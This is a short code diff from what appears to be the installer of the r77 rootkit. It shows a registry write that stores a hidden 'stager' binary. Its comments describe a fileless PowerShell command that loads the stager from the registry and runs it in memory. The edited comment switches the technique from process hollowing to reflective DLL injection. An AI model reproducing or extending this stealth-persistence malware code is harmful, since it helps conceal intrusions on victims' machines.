@@ -21,7 +21,7 @@ int main()
 		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;
 
 	// This powershell command loads the stager from the registry and executes it in memory using Assembly.Load().EntryPoint.Invoke()
-	// The C# binary will proceed with creating a native process using process hollowing.
+	// The C# binary will proceed with starting the r77 service using reflective DLL injection.
 	// The powershell command is purely inline and doesn't require a ps1 file.
 
 	LPWSTR powershellCommand = GetPowershellCommand();
